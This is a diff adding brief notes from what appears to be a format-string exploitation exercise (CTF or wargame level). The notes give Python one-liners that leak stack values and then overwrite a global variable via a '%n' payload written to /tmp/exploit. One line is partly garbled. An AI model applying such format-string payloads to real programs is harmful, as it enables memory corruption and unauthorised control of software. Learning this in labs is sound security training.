@@ -1,0 +1,11 @@
+we need to change global varible n  to  0x1025544 (16930116) using 
+  0x0804847a <+35>:    call   0x8048350 <fgets@plt>
+and
+   0x08048450 <+12>:    call   0x8048340 <printf@plt>
+   as in the level 3.
+
+print the stack to get location of a buffer
+   python -c 'print "aaaa" + " %x" * 15' > /tmp/exploit = 12$n
+
+
+python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
